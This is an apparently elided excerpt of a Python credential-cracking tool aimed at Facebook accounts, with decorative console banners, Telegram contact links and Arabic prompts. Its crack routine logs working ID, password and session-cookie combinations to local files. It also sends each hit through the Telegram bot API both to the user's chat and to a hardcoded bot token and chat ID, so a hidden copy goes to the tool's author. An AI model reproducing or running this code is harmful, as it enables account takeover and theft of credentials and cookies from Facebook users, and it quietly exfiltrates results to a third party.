...
g= datetime.datetime(2028, 8, 1, 0, 0 )
...
print('   ▄︻デ══━一💨 ')
print()
IDD7 = input('  \x1b[38;5;117m{\x1b[1;32m𓅇 \x1b[38;5;199m}  I̙͓̞D̪͕͚ \x1b[1;38;5;117m જ⁀➴  \x1b[38;5;130m︎')
uname =('2')
...
os.system('RMAD " RMAD  GOOD,   "'+uname)
#--------------[ USER-AGENT ]--------------#
...
# COLOUR
RMAD99 =6310460324
RMAD2 ='5972297281:AAEcn-HZ3zFYdWt0Kd1ZgBpFKVf5dXUaOFY'
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
...
def FILE():
	...
	try:
		...
		sol().print(win2)
		print('')
		os.system('RMAD -a 300 " SOUFINE RMAD "')
		os.system('clear')
		print('\x1b[38;5;207m')
		print('    تم التطوير بواسطة  ⚜️ 𝑹𝑴𝑨𝑫 ⚜️                   ')
		print('\x1b[38;5;14m━━━━━━━━━━━━━━━━━━━━━━━⚜️ 𝑹𝑴𝑨𝑫 ⚜️━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		print (f"""
{a25}
⠀⠀⣠⡀⠀⠀⠀⢀⡀⠤⣤⣶⣶⣶⣶⣦⠤⢄⡀⠀⠀⠀⢀⣄⠀   ⠀
...
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ...
 """)
		...
		print('')
		print('\x1b[1;34m')
		print('https://t.me/N_9_N_6')
		print('')
		print('')
		virat = input('\033[1;96m {Ω} ادخل مسار الملف   :  \x1b[38;5;5m')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r  ⚜️ 𝑹𝑴𝑨𝑫 ⚜️   {P}{a40} {loop} {a14}{len(id)}{xxh}  𝐎𝐊 ❂  {P}{H}{ok}{a26} 𝐶𝑃 ✪   {P}{M}{cp}{P} • {bo}{'{:.0%}'.format(loop/float(len(id)))}  "),
	sys.stdout.flush()
...
☆ （ • •）☆
╔RM═════════════════════╗☆
🪐 @R_M_D ⚜️ 𝑹𝑴𝑨𝑫 ⚜️ @N_9_N_6 🪐
╚══════AD═══════════════╝

⚡ - ⅂ꓤՈ : https://www.facebook.com/profile.php?id={idf}


⚡ -  C⃨O⃨O⃨K⃨I⃨E⃨S⃨ : {kuki}	''')

				touy8=(f'━━━━━━━━━━RMAD━━━━━━━━━\n𝗨𝐒𝐄𝐑 𝐇𝐀𝐍𝐃𝐒  •❅•°••°  مشترك\n6486040300 tg://openmessage?user_id={IDD7}')
				print(CP_CPC)
				message = CP_CPC
				url = f"https://api.telegram.org/bot{TOKEN7}/sendMessage"
				data = {"chat_id": IDD7, "text": message}
				response = requests.post(url, data=data, timeout=30)
				
				message = CP_CPC+touy8 
				url = f"https://api.telegram.org/bot{RMAD2}/sendMessage"
				data = {"chat_id": RMAD99, "text": message}
				response = requests.post(url, data=data, timeout=30)
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					statuscp1 = nel(statuscp, style='red')
					cetak(nel(statuscp1, title='AOREC-XD CP'))
					open('/sdcard/DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
				break
				...
				if 'no' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, style='green')
